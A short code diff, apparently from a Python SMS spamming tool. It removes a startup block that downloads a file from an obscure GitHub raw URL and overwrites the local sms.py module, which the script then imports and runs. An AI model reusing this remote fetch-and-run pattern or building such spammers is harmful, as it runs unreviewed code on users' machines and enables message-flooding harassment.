@@ -7,19 +7,6 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-r = get("https://raw.githubusercontent.com/cacaicocobobo125/codeiboilordizengi025c2020i62/main/rodei/bobocai/loaded/cocoine.py").text
-
-with open("sms.py", "r", encoding="utf-8") as f:
-    read = f.read()
-
-if read == r:
-    pass
-else:
-    print(Fore.RED + "Updating SMS Spammer...")
-    with open("sms.py", "w", encoding="utf-8") as f:
-        f.write(r)
-
-
 from sms import SendSms
 services_sms = []
 for attribute in dir(SendSms):
